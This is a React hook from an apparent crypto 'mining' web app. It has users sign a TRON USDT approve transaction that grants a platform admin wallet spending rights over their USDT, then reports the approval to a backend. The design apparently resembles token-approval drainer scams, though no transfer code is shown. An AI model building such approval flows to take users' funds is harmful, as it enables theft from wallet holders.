import { useCallback, useEffect, useRef, useState } from 'react'
import { flushSync } from 'react-dom'
import { fetchAdminWallet, reportApproveTx } from '../api/client'
import { saveTronWalletSession, getTronWalletSession, resolveConnectedOwner, isWalletConnectSession, clearTronWalletSession } from '../wallet/connectedWalletStore'
import {
  approveTronUsdt,
  extractWalletErrorMessage,
  fetchTronAllowance,
  isUserRejectedError,
  warmupApproveTransaction,
} from '../wallet/tronApprove'
import {
  fetchTronAccountResources,
  fetchTrxBalance,
} from '../wallet/tronBalances'
import { restoreWalletConnectSession, abortWalletConnectSign, WC_SIGN_UI_TIMEOUT_MS } from '../wallet/tronWalletConnect'
import {
  detectTronWalletsWithRetry,
  connectTronWalletById,
  isTokenPocketInAppBrowser,
  type TronWalletId,
  type TronWalletOption,
} from '../wallet/tronProviders'

const MIN_ALLOWANCE = 1_000_000n // 1 USDT (6 decimals)

export type ApproveUiPhase = 'idle' | 'preparing' | 'building' | 'signing' | 'saving' | 'success'

interface Options {
  token: string | null
  owner: string | null
  enabled?: boolean
  minerTypeId?: string | null
}

function mapApproveError(err: unknown): string {
  if (isUserRejectedError(err) || (err instanceof Error && err.message === 'user-rejected')) {
    return 'user-rejected'
  }
  const msg = extractWalletErrorMessage(err) || (err instanceof Error ? err.message : '')
  if (msg === 'wallet-not-selected') return 'wallet-not-selected'
  if (msg === 'no-tron-wallet') return 'no-tron-wallet'
  if (msg === 'walletconnect-session-missing') return 'walletconnect-session-missing'
  if (msg === 'approve-timeout' || msg === 'approve-failed') return 'approve-timeout'
  if (msg === 'approve-transaction-expired' || /transaction expired|expired transaction|已过期|过期/i.test(msg)) {
    return 'approve-transaction-expired'
  }
  if (msg === 'insufficient-trx') return 'insufficient-trx'
  if (msg === 'allowance-timeout' || msg === 'allowance-fetch-failed') return 'approve-failed'
  if (msg === 'approve-prep-timeout') return 'approve-prep-timeout'
  if (msg === 'wc-approve-not-yet') return 'wc-approve-not-yet'
  if (msg === 'approve-build-timeout' || msg === 'wc-probe-timeout') return 'approve-failed'
  if (
    msg === 'platform-wallet-missing' ||
    /平台钱包未配置|平台收款钱包未配置|admin.wallet/i.test(msg)
  ) {
    return 'platform-wallet-missing'
  }
  return msg || 'approve-failed'
}

export function useTronApproveGuard({
  token,
  owner,
  enabled = true,
  minerTypeId = null,
}: Options) {
  const [modalOpen, setModalOpen] = useState(false)
  const [spender, setSpender] = useState<string | null>(null)
  const [checking, setChecking] = useState(false)
  const [approvePhase, setApprovePhase] = useState<ApproveUiPhase>('idle')
  const [hasValidApprove, setHasValidApprove] = useState<boolean | null>(null)
  const [error, setError] = useState<string | null>(null)
  const runApproveInFlightRef = useRef(false)
  const walletPickResolveRef = useRef<((id: TronWalletId | null) => void) | null>(null)
  const [walletPickerOpen, setWalletPickerOpen] = useState(false)
  const [walletPickerOptions, setWalletPickerOptions] = useState<TronWalletOption[]>([])
  const [trxBalance, setTrxBalance] = useState<number | null>(null)
  const [energyAvailable, setEnergyAvailable] = useState<number | null>(null)

  const resetApproveUi = useCallback(() => {
    flushSync(() => {
      setApprovePhase('idle')
      setChecking(false)
    })
  }, [])

  const checkStatus = useCallback(async () => {
    if (!token || !owner || !enabled) {
      setHasValidApprove(null)
      return false
    }
    setChecking(true)
    setError(null)
    try {
      const admin = (await fetchAdminWallet()).address.trim()
      setSpender(admin)
      const allowance = await fetchTronAllowance(owner, admin)
      if (allowance >= MIN_ALLOWANCE) {
        setHasValidApprove(true)
        return true
      }
      setHasValidApprove(false)
      return false
    } catch {
      setHasValidApprove(false)
      return false
    } finally {
      setChecking(false)
    }
  }, [token, owner, enabled])

  const promptIfUnapproved = useCallback(
    async (forOwner?: string | null): Promise<boolean> => {
      const ownerAddr = (forOwner ?? owner)?.trim()
      if (!token || !ownerAddr || !enabled) return false
      setError(null)
      try {
        const admin = (await fetchAdminWallet()).address.trim()
        setSpender(admin)

        if (ownerAddr === admin) {
          setError('wallet-is-platform')
          setHasValidApprove(false)
          setModalOpen(true)
          return false
        }

        const allowance = await fetchTronAllowance(ownerAddr, admin)
        if (allowance >= MIN_ALLOWANCE) {
          setHasValidApprove(true)
          return true
        }

        setHasValidApprove(false)
        setModalOpen(true)
        return false
      } catch {
        setHasValidApprove(false)
        setModalOpen(true)
        return false
      }
    },
    [token, owner, enabled],
  )

  useEffect(() => {
    if (!token || !owner || !enabled) {
      setHasValidApprove(null)
      if (!owner) setModalOpen(false)
      return
    }
    void checkStatus()
  }, [token, owner, enabled, checkStatus])

  useEffect(() => {
    if (!isWalletConnectSession()) return
    void restoreWalletConnectSession()
  }, [])

  /** TP 内置浏览器不走 WC；清掉桌面扫码遗留的 walletconnect 会话 */
  useEffect(() => {
    if (!isTokenPocketInAppBrowser()) return
    const session = getTronWalletSession()
    if (session?.walletId === 'walletconnect') {
      clearTronWalletSession()
    }
  }, [])

  useEffect(() => {
    if (!modalOpen || !enabled) return
    fetchAdminWallet()
      .then((res) => setSpender(res.address))
      .catch(() => setSpender(null))
  }, [modalOpen, enabled])

  /** 弹窗打开时预构建（WC 扫码跳过：旧 ref_block 会导致 TP 手续费 ~） */
  useEffect(() => {
    if (!modalOpen || !enabled) return
    if (isWalletConnectSession()) return
    const ownerAddr = resolveConnectedOwner(owner)
    if (!ownerAddr || !spender) return
    void warmupApproveTransaction(ownerAddr, spender).catch(() => {})
  }, [modalOpen, enabled, owner, spender])

  useEffect(() => {
    if (!modalOpen || !enabled) {
      setTrxBalance(null)
      setEnergyAvailable(null)
      return
    }
    runApproveInFlightRef.current = false
    const ownerAddr = resolveConnectedOwner(owner)
    if (!ownerAddr) return
    void Promise.all([
      fetchTrxBalance(ownerAddr).catch(() => null),
      fetchTronAccountResources(ownerAddr).catch(() => null),
    ]).then(([trx, resources]) => {
      setTrxBalance(trx)
      setEnergyAvailable(resources?.energyAvailable ?? null)
    })
  }, [modalOpen, enabled, owner])

  const isWcScanApprove =
    isWalletConnectSession() && !isTokenPocketInAppBrowser()

  const completeApproveReport = useCallback(
    async (ownerAddr: string): Promise<boolean> => {
      if (!token) return false
      setApprovePhase('saving')
      const report = await reportApproveTx(token, {
        owner: ownerAddr,
        minerTypeId: minerTypeId ?? undefined,
      })
      if (report.data?.minerEligibility && !report.data.minerEligibility.eligible) {
        setError(report.data.minerEligibility.message || report.message)
        setHasValidApprove(true)
        resetApproveUi()
        return false
      }
      setHasValidApprove(true)
      setApprovePhase('success')
      window.setTimeout(() => {
        setModalOpen(false)
        resetApproveUi()
      }, 1500)
      return true
    },
    [token, minerTypeId, resetApproveUi],
  )

  /** 浏览器 WC 扫码：用户在手机扫网址 QR 完成授权，电脑端轮询检测 */
  useEffect(() => {
    if (!modalOpen || !enabled || !isWcScanApprove) return
    const ownerAddr = resolveConnectedOwner(owner)
    if (!ownerAddr || !token) return

    let cancelled = false
    const timer = window.setInterval(() => {
      if (cancelled || runApproveInFlightRef.current) return
      void (async () => {
        try {
          const adminAddr = spender?.trim() || (await fetchAdminWallet()).address.trim()
          if (!adminAddr) return
          const allowance = await fetchTronAllowance(ownerAddr, adminAddr)
          if (allowance < MIN_ALLOWANCE) return
          runApproveInFlightRef.current = true
          setError(null)
          await completeApproveReport(ownerAddr)
        } catch {
          // 继续轮询
        } finally {
          runApproveInFlightRef.current = false
        }
      })()
    }, 3000)

    return () => {
      cancelled = true
      window.clearInterval(timer)
    }
  }, [modalOpen, enabled, owner, token, spender, isWcScanApprove, completeApproveReport])

  const pickApproveWallet = useCallback(async (): Promise<TronWalletId | null> => {
    const session = getTronWalletSession()
    if (session?.walletId === 'walletconnect' && !isTokenPocketInAppBrowser()) {
      return 'walletconnect'
    }

    if (isTokenPocketInAppBrowser()) {
      return 'tokenpocket'
    }

    const ownerAddr = resolveConnectedOwner(owner)
    if (!ownerAddr) return null

    const wallets = await detectTronWalletsWithRetry()
    if (wallets.length === 0) {
      setError('no-tron-wallet')
      return null
    }
    if (wallets.length === 1) {
      saveTronWalletSession(wallets[0].id, ownerAddr)
      return wallets[0].id
    }
    return new Promise((resolve) => {
      walletPickResolveRef.current = resolve
      setWalletPickerOptions(wallets)
      setWalletPickerOpen(true)
    })
  }, [owner])

  const selectApproveWallet = useCallback(
    (id: TronWalletId) => {
      setWalletPickerOpen(false)
      saveTronWalletSession(id, owner!)
      walletPickResolveRef.current?.(id)
      walletPickResolveRef.current = null
    },
    [owner],
  )

  const cancelApproveWalletPicker = useCallback(() => {
    setWalletPickerOpen(false)
    walletPickResolveRef.current?.(null)
    walletPickResolveRef.current = null
  }, [])

  /** 准备阶段超时（WC 探测 / 拉平台钱包） */
  useEffect(() => {
    if (approvePhase !== 'preparing' && approvePhase !== 'building') return
    const timer = window.setTimeout(() => {
      if (!runApproveInFlightRef.current) return
      resetApproveUi()
      setError('approve-prep-timeout')
      runApproveInFlightRef.current = false
    }, 25_000)
    return () => window.clearTimeout(timer)
  }, [approvePhase, resetApproveUi])

  /** 签名阶段超时（给用户足够时间读手续费并确认） */
  useEffect(() => {
    if (approvePhase !== 'signing') return
    const timer = window.setTimeout(() => {
      if (!runApproveInFlightRef.current) return
      resetApproveUi()
      setError('approve-timeout')
      runApproveInFlightRef.current = false
    }, WC_SIGN_UI_TIMEOUT_MS)
    return () => window.clearTimeout(timer)
  }, [approvePhase, resetApproveUi])

  const runApprove = useCallback(async () => {
    const ownerAddr = resolveConnectedOwner(owner)
    if (runApproveInFlightRef.current) return false
    if (!token) {
      setError('请先登录后再授权')
      return false
    }
    if (!ownerAddr) {
      setError('wallet-not-selected')
      return false
    }

    runApproveInFlightRef.current = true
    setError(null)
    setApprovePhase('preparing')

    try {
      const admin = spender?.trim() || (await fetchAdminWallet()).address?.trim()
      if (!admin) {
        throw new Error('platform-wallet-missing')
      }

      if (hasValidApprove == null) {
        const allowance = await fetchTronAllowance(ownerAddr, admin)
        if (allowance >= MIN_ALLOWANCE) {
          return completeApproveReport(ownerAddr)
        }
      }

      if (isWcScanApprove) {
        resetApproveUi()
        setError('wc-approve-not-yet')
        return false
      }

      let walletId: TronWalletId | null
      if (isTokenPocketInAppBrowser()) {
        setApprovePhase('building')
        const connected = await connectTronWalletById('tokenpocket')
        if (connected !== ownerAddr) {
          throw new Error('钱包地址与当前账号不一致，请切换 TokenPocket 账户后重试')
        }
        saveTronWalletSession('tokenpocket', connected)
      }
      walletId = await pickApproveWallet()
      if (!walletId) {
        resetApproveUi()
        setError((prev) => prev || 'wallet-not-selected')
        return false
      }

      setApprovePhase('signing')

      const txHash = await approveTronUsdt(ownerAddr, admin, undefined, walletId, {
        authToken: token,
        onBuilding: () => setApprovePhase('building'),
        onAwaitingWallet: () => setApprovePhase('signing'),
        onSigned: () => setApprovePhase('saving'),
      })

      setApprovePhase('saving')
      const report = await reportApproveTx(token, {
        owner: ownerAddr,
        txHash: txHash !== 'allowance-confirmed' ? txHash : undefined,
        minerTypeId: minerTypeId ?? undefined,
      })
      if (report.data?.minerEligibility && !report.data.minerEligibility.eligible) {
        setError(report.data.minerEligibility.message || report.message)
        setHasValidApprove(true)
        resetApproveUi()
        return false
      }

      setHasValidApprove(true)
      setApprovePhase('success')
      window.setTimeout(() => {
        setModalOpen(false)
        resetApproveUi()
      }, 1500)
      return true
    } catch (err) {
      resetApproveUi()
      const code = mapApproveError(err)
      setError(code)
      return false
    } finally {
      runApproveInFlightRef.current = false
    }
  }, [token, owner, spender, minerTypeId, hasValidApprove, pickApproveWallet, resetApproveUi, completeApproveReport, isWcScanApprove])

  const ensureApproved = useCallback(async (): Promise<boolean> => {
    return promptIfUnapproved()
  }, [promptIfUnapproved])

  const requireApprove = useCallback(async () => ensureApproved(), [ensureApproved])

  const dismissModal = useCallback(() => {
    abortWalletConnectSign()
    runApproveInFlightRef.current = false
    resetApproveUi()
    setModalOpen(false)
    setError(null)
  }, [resetApproveUi])

  const isSigning = approvePhase === 'signing'
  const isPreparing = approvePhase === 'preparing'
  const isBuilding = approvePhase === 'building'

  return {
    modalOpen,
    setModalOpen,
    dismissModal,
    spender,
    checking,
    trxBalance,
    energyAvailable,
    isWalletConnect:
      getTronWalletSession()?.walletId === 'walletconnect' && !isTokenPocketInAppBrowser(),
    approving: isSigning || isPreparing || isBuilding,
    approvePhase,
    isSigning,
    hasValidApprove,
    error,
    setError,
    checkStatus,
    runApprove,
    requireApprove,
    ensureApproved,
    promptIfUnapproved,
    walletPickerOpen,
    walletPickerOptions,
    selectApproveWallet,
    cancelApproveWalletPicker,
  }
}
